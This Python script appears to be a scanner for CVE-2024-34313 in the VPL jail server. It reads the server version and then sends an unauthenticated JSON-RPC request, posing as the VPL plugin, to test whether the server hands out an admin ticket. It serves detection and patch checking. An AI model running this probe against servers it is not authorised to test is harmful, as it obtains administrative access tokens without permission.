import requests
import random
import warnings
import argparse

warnings.filterwarnings('ignore', message='Unverified HTTPS request')

args = argparse.ArgumentParser()
args.add_argument('--host', help='VPL jail server host', required=True)
args.add_argument('--verify-ssl', help='Verify SSL certificate', action='store_true')
args = args.parse_args()

JAIL_SERVER_HOST = args.host
VERIFY_SSL = args.verify_ssl
HEADERS = {
    'Content-type': 'application/json;charset=UTF-8',
    'User-Agent': 'VPL 4.2.3',
}


def get_server_version() -> str:
    response = requests.get(JAIL_SERVER_HOST, headers=HEADERS, verify=VERIFY_SSL)
    server = response.headers['Server']
    server_name, server_version = server.split(' ')
    assert server_name == 'vpl-jail-system'
    
    return server_version

def is_version_vulnerable(version: str) -> bool:
    major, minor, patch = version.split('.')
    major, minor, patch = int(major), int(minor), int(patch)

    if major < 4:
        return True
    if major == 4 and minor == 0 and patch < 3:
        return True

    return False

def get_admin_ticket() -> str:
    data = {
        'method': 'request',
        'params': {
            'filestodelete': [],
            'files': {},
            'fileencoding': {},
            'adminticket': '',
            'pluginversion': 2024011312,
        },
        'id': '3-32354-' + str(random.randint(1000000000, 9999999999)),
    }

    response = requests.post(JAIL_SERVER_HOST, headers=HEADERS, json=data, verify=VERIFY_SSL)
    if response.status_code != 200:
        return None

    result = response.json()['result']
    assert "adminticket" in result
    assert "executionticket" in result

    return result['adminticket']

if __name__ == '__main__':
    print(f"Checking {JAIL_SERVER_HOST} server version and security parameters...")
    print()

    server_version = get_server_version()

    if is_version_vulnerable(server_version):
        print("Server is running a vulnerable version:", server_version)
    else:
        print("Server is running a secure version:", server_version)
        exit(0)

    admin_ticket = get_admin_ticket()
    if admin_ticket:
        print("Server is vulnerable to CVE-2024-34313!")
        exit(1)
    else:
        print("Server utilizes security parameters and may be protected against CVE-2024-34313")
        exit(0)
